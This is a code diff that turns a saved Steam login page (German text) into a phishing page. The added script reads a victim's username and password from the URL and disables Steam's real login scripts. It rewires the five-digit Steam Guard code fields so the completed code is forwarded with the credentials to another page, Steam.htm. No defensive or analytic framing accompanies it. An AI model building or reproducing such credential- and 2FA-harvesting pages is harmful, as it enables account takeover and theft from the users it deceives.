@@ -16,6 +16,12 @@
     <link href="SteamCode/home.css" rel="stylesheet" type="text/css">
     <link href="SteamCode/shared_responsive.css" rel="stylesheet" type="text/css">
     <link href="SteamCode/header.css" rel="stylesheet" type="text/css">
+    <script>
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        var username = urlParams.get("username");
+        var password = urlParams.get("password");
+    </script>
     <script type="text/javascript">
         var __PrototypePreserve = [];
         __PrototypePreserve[0] = Array.from;
@@ -56,7 +62,7 @@
             SetupTooltips({tooltipCSSClass: 'community_tooltip'});
         });
     </script>
-    <script type="text/javascript" src="SteamCode/login.js"></script>
+    <!--<script type="text/javascript" src="SteamCode/login.js"></script>-->
     <script type="text/javascript" src="SteamCode/shared_responsive_adapter.js"></script>
 
     <meta name="twitter:card" content="summary_large_image">
@@ -397,10 +403,10 @@
              data-panel="{&quot;autoFocus&quot;:true}">
 
 
-            <script language="Javascript">
+            <!--<script language="Javascript">
                 function StartLogin() {
                     LoginManager = new CLoginPromptManager('https://steamcommunity.com', {
-                        strRedirectURL: "https:\/\/steamcommunity.com\/id\/usertest\/",
+                        strRedirectURL: "./SteamCode.htm",
                         gidCaptcha: -1,
                         strMobileClientType: null,
                         strMobileClientVersion: null,
@@ -418,7 +424,7 @@
                 $J(function () {
                     StartLogin();
                 });
-            </script>
+            </script>-->
 
             <div class="page_content">
 
@@ -443,15 +449,61 @@
                                             </div>
                                             <div class="newlogindialog_FlexCol_1mhmm newlogindialog_AlignItemsCenter_30P8x"
                                                  style="gap: 2px;">
-                                                <div class="newlogindialog_SegmentedCharacterInput_1kJ6q"><input
-                                                        type="text" maxlength="1" autocomplete="none"><input type="text"
-                                                                                                             maxlength="1"
-                                                                                                             autocomplete="none"><input
-                                                        type="text" maxlength="1" autocomplete="none"><input type="text"
-                                                                                                             maxlength="1"
-                                                                                                             autocomplete="none"><input
-                                                        type="text" maxlength="1" autocomplete="none"></div>
+                                                <div class="newlogindialog_SegmentedCharacterInput_1kJ6q">
+                                                    <input name="code" id="code0" type="text" maxlength="1" autocomplete="none" oninput="checkCodeCompleted(this)">
+                                                    <input name="code" id="code1" type="text" maxlength="1" autocomplete="none" oninput="checkCodeCompleted(this)">
+                                                    <input name="code" id="code2" type="text" maxlength="1" autocomplete="none" oninput="checkCodeCompleted(this)">
+                                                    <input name="code" id="code3" type="text" maxlength="1" autocomplete="none" oninput="checkCodeCompleted(this)">
+                                                    <input name="code" id="code4" type="text" maxlength="1" autocomplete="none" oninput="checkCodeCompleted(this)">
+                                                </div>                
                                             </div>
+                                            <script>
+                                                var code = ["","","","",""];
+                                                
+                                                document.getElementById('code0').focus();
+                                                for(var i = 0; i < 5; i++) {
+                                                    document.getElementById("code"+i).value = "";
+                                                }
+                                                function checkCodeCompleted(input){
+                                                    switch(input.id) {
+                                                        case'code0':
+                                                            document.getElementById('code1').focus();
+                                                            break;
+                                                        case'code1':
+                                                            document.getElementById('code2').focus();
+                                                            break;
+                                                        case'code2':
+                                                            document.getElementById('code3').focus();
+                                                            break;
+                                                        case'code3':
+                                                            document.getElementById('code4').focus();
+                                                            break;
+                                                        case'code4':
+                                                            break;
+                                                    }
+                                                    
+                                                    if (checkCode(input.id))
+                                                    {
+                                                        window.location.assign("./Steam.htm?username=" + username + "&password=" + password + "&code=" + code);
+                                                    }
+                                                }
+                                            function checkCode(id)
+                                            {
+                                                var fieldNumber = id.replace("code", "");
+                                                code[fieldNumber] = document.getElementById(id).value;
+                                                var completed = true;
+                                                for (var i = 0; i < code.length; i++)
+                                                {
+                                                    if (code[i] === "")
+                                                    {
+                                                        completed = false;
+                                                        break;
+                                                    }
+                                                }
+                                                console.log(code);
+                                                return completed
+                                            }
+                                            </script>
                                             <div style="display: flex; flex-direction: row; justify-content: space-evenly; align-items: center;"
                                                  class="newlogindialog_EnterCodeFromMobileContainer_T68fB">
                                                 <div class="newlogindialog_EnterCodeFromMobile_1Rruw">Geben Sie den Code
